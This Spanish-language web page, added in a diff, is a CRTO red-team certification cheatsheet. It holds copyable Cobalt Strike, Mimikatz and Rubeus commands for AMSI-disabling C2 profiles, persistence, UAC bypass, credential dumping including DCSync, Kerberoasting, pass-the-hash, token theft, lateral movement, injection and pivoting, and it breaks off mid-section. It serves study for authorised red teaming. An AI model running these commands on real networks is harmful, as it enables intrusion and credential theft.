@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#050510">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>CRTO Cheatsheet - Red Team Operations | Guarina0x0</title>
+    <meta name="description" content="CRTO (Certified Red Team Operator) - Cheatsheet completa de comandos de Red Team Operations: C2 Setup, Cobalt Strike, Kerberos, Lateral Movement, Pivoting, Domain Dominance y m&aacute;s.">
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="manifest" href="manifest.json">
+    <link rel="canonical" href="https://guarina0x0.github.io/crto-cheatsheet.html">
+    <meta property="og:url" content="https://guarina0x0.github.io/crto-cheatsheet.html">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CRTO Cheatsheet - Red Team Operations | Guarina0x0">
+    <meta property="og:description" content="CRTO (Certified Red Team Operator) - Cheatsheet completa de comandos de Red Team Operations: C2 Setup, Cobalt Strike, Kerberos, Lateral Movement, Pivoting, Domain Dominance y mas.">
+    <meta property="og:site_name" content="Guarina0x0">
+    <meta name="twitter:title" content="CRTO Cheatsheet - Red Team Operations | Guarina0x0">
+    <meta name="twitter:description" content="CRTO (Certified Red Team Operator) - Cheatsheet completa de comandos de Red Team Operations: C2 Setup, Cobalt Strike, Kerberos, Lateral Movement, Pivoting, Domain Dominance y mas.">
+    <meta property="og:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta name="twitter:site" content="@Guarina0x0">
+    <meta name="twitter:creator" content="@Guarina0x0">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="CRTO Cheatsheet - Red Team Operations con Cobalt Strike">
+    <meta name="author" content="Guarina0x0">
+    <meta name="keywords" content="CRTO, Certified Red Team Operator, Cobalt Strike, C2, lateral movement, pivoting, domain dominance, defence evasion, cheatsheet, red team">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Exo+2:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "CRTO Cheatsheet - Red Team Operations",
+        "description": "CRTO (Certified Red Team Operator) - Cheatsheet completa de Cobalt Strike, C2, lateral movement, persistence y defence evasion.",
+        "author": {"@type": "Person", "name": "Guarina0x0", "url": "https://guarina0x0.github.io"},
+        "publisher": {"@type": "Person", "name": "Guarina0x0"},
+        "url": "https://guarina0x0.github.io/crto-cheatsheet.html",
+        "datePublished": "2026-02-14",
+        "dateModified": "2026-02-14",
+        "inLanguage": "es",
+        "isPartOf": {
+            "@type": "CollectionPage",
+            "name": "Cheatsheets Arsenal",
+            "url": "https://guarina0x0.github.io/cheatsheets.html"
+        }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            {"@type": "ListItem", "position": 1, "name": "Portal", "item": "https://guarina0x0.github.io/"},
+            {"@type": "ListItem", "position": 2, "name": "Cheatsheets", "item": "https://guarina0x0.github.io/cheatsheets.html"},
+            {"@type": "ListItem", "position": 3, "name": "CRTO - Red Team Operations"}
+        ]
+    }
+    </script>
+    <link rel="stylesheet" href="styles.css">
+    <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
+</head>
+<body>
+<a href="#main-content" class="skip-link">Saltar al contenido</a>
+<div class="reading-progress" id="readingProgress"></div>
+
+<div class="grid-overlay"></div>
+
+<!-- Nav -->
+<nav class="nav" id="nav">
+    <a href="/" class="nav-brand">
+        <div class="nav-logo"><span>G</span></div>
+        <span class="nav-title">GUARINA0x0</span>
+    </a>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="/">Portal</a></li>
+        <li><a href="/#categorias">Categor&iacute;as</a></li>
+        <li><a href="cheatsheets.html">Cheatsheets</a></li>
+        <li><a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer">GitHub</a></li>
+    </ul>
+    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+    </button>
+    <button class="search-trigger" id="searchTrigger" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        <kbd>Ctrl+K</kbd>
+    </button>
+    <div class="nav-hamburger" id="hamburger" role="button" aria-label="Toggle navigation menu" tabindex="0">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</nav>
+
+<!-- Breadcrumbs -->
+<nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="/">Portal</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="cheatsheets.html">Cheatsheets</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">CRTO</span>
+</nav>
+
+<!-- Hero -->
+<section class="page-hero">
+    <div class="page-hero-tag">// Dimensi&oacute;n C-600 :: Certified Red Team Operator</div>
+    <h1><span class="accent">CRTO</span> Cheatsheet</h1>
+    <p class="page-hero-desc">Comandos y t&eacute;cnicas de Red Team Operations recopilados durante la preparaci&oacute;n y examen del CRTO. Desde C2 Setup hasta Domain Dominance con Cobalt Strike.</p>
+    <div class="page-hero-badges">
+        <span class="badge">Cobalt Strike</span>
+        <span class="badge">Kerberos</span>
+        <span class="badge">Lateral Movement</span>
+        <span class="badge">Pivoting</span>
+        <span class="badge">MSSQL</span>
+        <span class="badge">Domain Dominance</span>
+        <span class="badge">Defence Evasion</span>
+    </div>
+    <a class="credential-verify" href="https://badges.parchment.eu/public/assertions/Fd1yqdbjQi-gjl1uouhjQA" target="_blank" rel="noopener noreferrer">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        Verificar Credencial
+    </a>
+</section>
+
+<div class="page-layout">
+
+<!-- Sidebar -->
+<aside class="sidebar" role="complementary" aria-label="Navigation sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <ul class="sidebar-nav">
+        <li><a href="#c2setup"><span class="num">01</span> C2 Setup &amp; Infrastructure</a></li>
+        <li><a href="#postexploitation"><span class="num">02</span> Post-Exploitation</a></li>
+        <li><a href="#hostpersistence"><span class="num">03</span> Host Persistence</a></li>
+        <li><a href="#privesc"><span class="num">04</span> Privilege Escalation</a></li>
+        <li><a href="#elevatedpersistence"><span class="num">05</span> Elevated Persistence</a></li>
+        <li><a href="#credtheft"><span class="num">06</span> Credential Theft</a></li>
+        <li><a href="#impersonation"><span class="num">07</span> User Impersonation</a></li>
+        <li><a href="#domainrecon"><span class="num">08</span> Domain Reconnaissance</a></li>
+        <li><a href="#lateralmovement"><span class="num">09</span> Lateral Movement</a></li>
+        <li><a href="#sessionpassing"><span class="num">10</span> Session Passing</a></li>
+        <li><a href="#pivoting"><span class="num">11</span> Pivoting</a></li>
+        <li><a href="#kerberos"><span class="num">12</span> Kerberos Attacks</a></li>
+        <li><a href="#adcs"><span class="num">13</span> AD CS (Certificate Abuse)</a></li>
+        <li><a href="#gpoabuse"><span class="num">14</span> GPO Abuse</a></li>
+        <li><a href="#dpapi"><span class="num">15</span> DPAPI</a></li>
+        <li><a href="#mssql"><span class="num">16</span> MSSQL Servers</a></li>
+        <li><a href="#sccm"><span class="num">17</span> SCCM</a></li>
+        <li><a href="#domaindominance"><span class="num">18</span> Domain Dominance</a></li>
+        <li><a href="#trusts"><span class="num">19</span> Forest &amp; Domain Trusts</a></li>
+        <li><a href="#laps"><span class="num">20</span> LAPS</a></li>
+        <li><a href="#evasion"><span class="num">21</span> Defence Evasion &amp; AppLocker</a></li>
+        <li><a href="#datahunting"><span class="num">22</span> Data Hunting &amp; Exfiltration</a></li>
+    </ul>
+</aside>
+
+<!-- Main Content -->
+<main class="content" id="main-content" role="main">
+
+<!-- 01 C2 SETUP & INFRASTRUCTURE -->
+<div class="section-block reveal" id="c2setup">
+    <div class="section-number">// 01</div>
+    <h2>C2 Setup &amp; <span class="accent">Infrastructure</span></h2>
+
+    <h3>Artifact Kit Build</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Artifact Kit Build</span>
+./build.sh pipe VirtualAlloc 310272 5 false false none /path/to/artifacts
+
+<span class="comment"># Resource Kit Build</span>
+./build.sh /path/to/resources
+
+<span class="comment"># Mimikatz Kit Build</span>
+./build.sh /path/to/mimikatz</pre></div>
+    </div>
+
+    <h3>AK-Settings (Spawn Process Config)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe</pre></div>
+    </div>
+
+    <h3>Malleable C2 Profile</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Malleable C2</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Stage block</span>
+stage {
+   set userwx "false";
+   set module_x64 "Hydrogen.dll";
+   set copy_pe_header "false";
+}
+
+<span class="comment"># Post-ex block</span>
+post-ex {
+  set amsi_disable "true";
+  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
+  set obfuscate "true";
+  set cleanup "true";
+}
+
+<span class="comment"># Process-inject block</span>
+process-inject {
+  execute {
+      NtQueueApcThread-s;
+      NtQueueApcThread;
+      SetThreadContext;
+      RtlCreateUserThread;
+      CreateThread;
+  }
+}</pre></div>
+    </div>
+
+    <h3>Verify Artifact &amp; Named Pipe</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Verify artifact with ThreatCheck</span>
+C:\Tools\ThreatCheck\ThreatCheck.exe -f C:\path\to\artifact64svcbig.exe
+
+<span class="comment"># Named pipe (artifact kit)</span>
+sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);</pre></div>
+    </div>
+</div>
+
+<!-- 02 POST-EXPLOITATION -->
+<div class="section-block reveal" id="postexploitation">
+    <div class="section-number">// 02</div>
+    <h2><span class="accent">Post</span>-Exploitation</h2>
+
+    <h3>Session Passing &amp; File Operations</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Session passing</span>
+spawn x64 &lt;LISTENER&gt;
+
+<span class="comment"># File operations</span>
+cd C:\Users\&lt;USER&gt;\Desktop
+ls
+download &lt;FILE&gt;
+downloads
+
+<span class="comment"># Process listing</span>
+ps</pre></div>
+    </div>
+
+    <h3>Keylogger &amp; Screenshots</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Keylogger</span>
+keylogger
+jobs
+jobkill &lt;JOB_ID&gt;
+
+<span class="comment"># Screenshots</span>
+printscreen
+screenshot
+screenwatch</pre></div>
+    </div>
+
+    <h3>Command Execution</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Command execution</span>
+shell whoami
+run hostname
+powershell &lt;COMMAND&gt;
+powerpick &lt;COMMAND&gt;
+
+<span class="comment"># PowerShell import</span>
+powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+
+<span class="comment"># .NET Assembly execution</span>
+execute-assembly C:\Tools\Seatbelt\Seatbelt.exe -group=system
+
+<span class="comment"># Beacon Object File (BOF)</span>
+inline-execute C:\Tools\BOFs\ipconfig.o</pre></div>
+    </div>
+</div>
+
+<!-- 03 HOST PERSISTENCE -->
+<div class="section-block reveal" id="hostpersistence">
+    <div class="section-number">// 03</div>
+    <h2>Host <span class="accent">Persistence</span></h2>
+
+    <h3>Registry Run Key</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "&lt;NAME&gt;" -Value "&lt;PAYLOAD_PATH&gt;"</pre></div>
+    </div>
+
+    <h3>Startup Folder</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>copy &lt;PAYLOAD&gt; "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"</pre></div>
+    </div>
+
+    <h3>Scheduled Task</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>schtasks /create /tn "&lt;TASK_NAME&gt;" /tr "&lt;PAYLOAD_PATH&gt;" /sc onlogon /ru "&lt;USER&gt;"</pre></div>
+    </div>
+
+    <h3>COM Hijacking</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># COM Hijacking (Teams example)</span>
+reg add "HKCU\Software\Classes\CLSID\{&lt;CLSID&gt;}\InprocServer32" /v "" /d "&lt;DLL_PATH&gt;" /f
+reg add "HKCU\Software\Classes\CLSID\{&lt;CLSID&gt;}\InprocServer32" /v "ThreadingModel" /d "Both" /f</pre></div>
+    </div>
+
+    <h3>Timestomping</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>timestomp &lt;TARGET_FILE&gt; &lt;REFERENCE_FILE&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 04 PRIVILEGE ESCALATION -->
+<div class="section-block reveal" id="privesc">
+    <div class="section-number">// 04</div>
+    <h2>Privilege <span class="accent">Escalation</span></h2>
+
+    <h3>Check Current Integrity</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powershell [Security.Principal.WindowsIdentity]::GetCurrent().Groups | ? {$_.Value -eq "S-1-16-12288"}</pre></div>
+    </div>
+
+    <h3>Service Enumeration &amp; Abuse</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Service enumeration</span>
+run sc query
+run sc qc &lt;SERVICE_NAME&gt;
+
+<span class="comment"># Unquoted service path exploitation</span>
+<span class="comment"># Upload beacon to unquoted path location</span>
+upload C:\Payloads\beacon.exe
+
+<span class="comment"># Weak service permissions</span>
+.\accesschk64.exe -uwcqv "&lt;USER&gt;" *
+run sc config &lt;SERVICE&gt; binPath= "&lt;PAYLOAD_PATH&gt;"
+run sc stop &lt;SERVICE&gt;
+run sc start &lt;SERVICE&gt;</pre></div>
+    </div>
+
+    <h3>UAC Bypass</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># UAC Bypass</span>
+elevate uac-schtasks &lt;LISTENER&gt;
+
+<span class="comment"># Connect to local TCP beacon</span>
+connect localhost &lt;PORT&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 05 ELEVATED PERSISTENCE -->
+<div class="section-block reveal" id="elevatedpersistence">
+    <div class="section-number">// 05</div>
+    <h2>Elevated <span class="accent">Persistence</span></h2>
+
+    <h3>Scheduled Task as SYSTEM</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>schtasks /create /tn "&lt;TASK_NAME&gt;" /tr "&lt;PAYLOAD_PATH&gt;" /sc onstart /ru SYSTEM</pre></div>
+    </div>
+
+    <h3>Windows Service Persistence</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>sc create &lt;SERVICE_NAME&gt; binPath= "&lt;PAYLOAD_PATH&gt;" start= auto
+sc start &lt;SERVICE_NAME&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 06 CREDENTIAL THEFT -->
+<div class="section-block reveal" id="credtheft">
+    <div class="section-number">// 06</div>
+    <h2>Credential <span class="accent">Theft</span></h2>
+
+    <h3>Mimikatz via Cobalt Strike</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Mimikatz - combine commands with ";"</span>
+mimikatz token::elevate ; lsadump::sam
+
+<span class="comment"># Logon passwords (NTLM hashes)</span>
+mimikatz !sekurlsa::logonpasswords
+
+<span class="comment"># Kerberos encryption keys</span>
+mimikatz !sekurlsa::ekeys
+
+<span class="comment"># SAM database dump</span>
+mimikatz !lsadump::sam
+
+<span class="comment"># Cached domain credentials</span>
+mimikatz !lsadump::cache
+
+<span class="comment"># DCSync (requires Domain Admin or replication rights)</span>
+dcsync &lt;DOMAIN&gt; &lt;DOMAIN&gt;\krbtgt</pre></div>
+    </div>
+
+    <h3>Rubeus - Ticket Operations</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Rubeus - Triage tickets</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe triage
+
+<span class="comment"># Rubeus - Dump specific ticket</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /luid:&lt;LUID&gt; /service:krbtgt /nowrap
+
+<span class="comment"># Kerberoasting</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /user:&lt;SERVICE_USER&gt; /nowrap
+
+<span class="comment"># AS-REP Roasting</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /user:&lt;USER&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Browser &amp; Vault Credentials</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SharpChrome - Browser credentials</span>
+execute-assembly C:\Tools\SharpChrome\SharpChrome.exe logins
+
+<span class="comment"># SharpDPAPI - Credential Manager</span>
+execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe credentials /rpc
+
+<span class="comment"># Seatbelt - Vault enumeration</span>
+execute-assembly C:\Tools\Seatbelt\Seatbelt.exe WindowsVault</pre></div>
+    </div>
+</div>
+
+<!-- 07 USER IMPERSONATION -->
+<div class="section-block reveal" id="impersonation">
+    <div class="section-number">// 07</div>
+    <h2>User <span class="accent">Impersonation</span></h2>
+
+    <h3>Pass the Hash &amp; Make Token</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Pass the Hash</span>
+pth &lt;DOMAIN&gt;\&lt;USER&gt; &lt;NTLM_HASH&gt;
+
+<span class="comment"># Make Token (plaintext password)</span>
+make_token &lt;DOMAIN&gt;\&lt;USER&gt; &lt;PASSWORD&gt;</pre></div>
+    </div>
+
+    <h3>Overpass the Hash &amp; Pass the Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Overpass the Hash (request TGT)</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /aes256:&lt;AES256_HASH&gt; /nowrap /opsec
+
+<span class="comment"># Pass the Ticket</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:&lt;DOMAIN&gt; /username:&lt;USER&gt; /password:FakePass /ticket:&lt;BASE64_TICKET&gt;</pre></div>
+    </div>
+
+    <h3>Token Manipulation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Steal Token from process</span>
+steal_token &lt;PID&gt;
+
+<span class="comment"># Revert to original token</span>
+rev2self
+
+<span class="comment"># Token Store (Cobalt 4.8+)</span>
+token-store steal &lt;PID&gt;
+token-store use &lt;TOKEN_ID&gt;
+token-store show
+
+<span class="comment"># Verify impersonation</span>
+run klist
+ls \\&lt;TARGET&gt;.&lt;DOMAIN&gt;\c$</pre></div>
+    </div>
+</div>
+
+<!-- 08 DOMAIN RECONNAISSANCE -->
+<div class="section-block reveal" id="domainrecon">
+    <div class="section-number">// 08</div>
+    <h2>Domain <span class="accent">Reconnaissance</span></h2>
+
+    <h3>PowerView</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+powerpick Get-Domain
+powerpick Get-DomainController | select Forest, Name, OSVersion | fl
+powerpick Get-DomainUser -Identity &lt;USER&gt; -Properties DisplayName, MemberOf | fl
+powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+powerpick Get-DomainOU -Properties Name | sort -Property Name
+powerpick Get-DomainGroup | where Name -like "*Admins*" | select Name
+powerpick Get-DomainGroupMember -Identity "&lt;GROUP&gt;" | select MemberName
+powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
+powerpick Get-DomainTrust</pre></div>
+    </div>
+
+    <h3>SharpView &amp; ADSearch</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SharpView</span>
+execute-assembly C:\Tools\SharpView\SharpView.exe Get-DomainUser -Identity &lt;USER&gt;
+
+<span class="comment"># ADSearch (LDAP queries)</span>
+execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "objectCategory=user"
+execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&amp;(objectCategory=group)(cn=*admins*))" --attributes cn,member
+execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(objectCategory=trustedDomain)" --attributes distinguishedName,name,flatName,trustDirection</pre></div>
+    </div>
+
+    <h3>ACL Enumeration &amp; BOFHound</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># ACL enumeration</span>
+powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "&lt;SID_PATTERN&gt;" }
+
+<span class="comment"># BOFHound (BloodHound integration)</span>
+inline-execute C:\Tools\BOFs\bofhound.o</pre></div>
+    </div>
+</div>
+
+<!-- 09 LATERAL MOVEMENT -->
+<div class="section-block reveal" id="lateralmovement">
+    <div class="section-number">// 09</div>
+    <h2>Lateral <span class="accent">Movement</span></h2>
+
+    <h3>WinRM &amp; PsExec</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># WinRM</span>
+jump winrm64 &lt;TARGET&gt;.&lt;DOMAIN&gt; &lt;LISTENER&gt;
+
+<span class="comment"># PsExec</span>
+jump psexec64 &lt;TARGET&gt;.&lt;DOMAIN&gt; &lt;LISTENER&gt;</pre></div>
+    </div>
+
+    <h3>WMI &amp; Remote PowerShell</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># WMI</span>
+remote-exec wmi &lt;TARGET&gt;.&lt;DOMAIN&gt; &lt;COMMAND&gt;
+
+<span class="comment"># Remote PowerShell command</span>
+remote-exec winrm &lt;TARGET&gt; &lt;COMMAND&gt;</pre></div>
+    </div>
+
+    <h3>DCOM</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powershell-import C:\Tools\Invoke-DCOM.ps1
+powerpick Invoke-DCOM -ComputerName &lt;TARGET&gt;.&lt;DOMAIN&gt; -Method MMC20.Application -Listener &lt;LISTENER&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 10 SESSION PASSING -->
+<div class="section-block reveal" id="sessionpassing">
+    <div class="section-number">// 10</div>
+    <h2>Session <span class="accent">Passing</span></h2>
+
+    <h3>Spawn &amp; SpawnAs</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Spawn new beacon (same or different listener)</span>
+spawn x64 &lt;LISTENER&gt;
+spawn x86 &lt;LISTENER&gt;
+
+<span class="comment"># Spawn as different user</span>
+spawnas &lt;DOMAIN&gt;\&lt;USER&gt; &lt;PASSWORD&gt; &lt;LISTENER&gt;</pre></div>
+    </div>
+
+    <h3>Foreign Listener &amp; Injection</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Foreign Listener (Meterpreter)</span>
+<span class="comment"># Create Foreign HTTP/HTTPS listener in Cobalt Strike</span>
+<span class="comment"># Then: shspawn x64 &lt;FOREIGN_LISTENER&gt;</span>
+
+<span class="comment"># Inject into process</span>
+inject &lt;PID&gt; x64 &lt;LISTENER&gt;
+shinject &lt;PID&gt; x64 C:\Payloads\payload.bin</pre></div>
+    </div>
+</div>
+
+<!-- 11 PIVOTING -->
+<div class="section-block reveal" id="pivoting">
+    <div class="section-number">// 11</div>
+    <h2><span class="accent">Pivoting</span></h2>
+
+    <h3>SOCKS Proxy</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>socks 1080
+socks 1080 socks5 disableNoAuth &lt;USER&gt; &lt;PASSWORD&gt; enableLogging</pre></div>
+    </div>
+
+    <h3>Proxychains &amp; Linux Tools</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Linux</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Proxychains config (/etc/proxychains.conf)</span>
+<span class="comment"># socks4 127.0.0.1 1080</span>
+<span class="comment"># socks5 127.0.0.1 1080</span>
+
+<span class="comment"># Linux tools through proxy</span>
+proxychains nmap -n -Pn -sT -p &lt;PORTS&gt; &lt;TARGET_IP&gt;
+proxychains wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_IP&gt;</pre></div>
+    </div>
+
+    <h3>Reverse Port Forward &amp; PortBender</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
